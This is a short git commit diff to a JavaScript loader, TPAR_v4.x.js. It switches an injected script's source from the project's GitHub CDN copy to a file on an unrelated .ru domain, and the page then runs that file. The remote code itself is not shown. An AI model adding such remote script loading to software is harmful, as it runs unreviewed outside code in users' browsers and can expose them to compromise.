466c9561fdf5a43118602c179ab4c12240e4040d
RGB | Outlaw <101356538+RGB-Outl4w@users.noreply.github.com>
2024-03-24 13:21:21 +0400

    Update TPAR_v4.x.js

--- TPAR_v4.x.js
+++ TPAR_v4.x.js
@@ -16,7 +16,8 @@ document.getElementById("root").innerHTML = "";
 
 var s = document.createElement("script");
 s.type = "text/javascript";
-s.src = "https://cdn.jsdelivr.net/gh/RGB-Outl4w/ThePixelsAutoReloaded/assets/index-GKUHWpC_.js";
+s.src = "https://pipyoutube.ru/cats/index-GKUHWpC_.js";
+// s.src = "https://cdn.jsdelivr.net/gh/RGB-Outl4w/ThePixelsAutoReloaded/assets/index-GKUHWpC_.js"; 
 s.type = "module";
   
 document.head.appendChild(s);
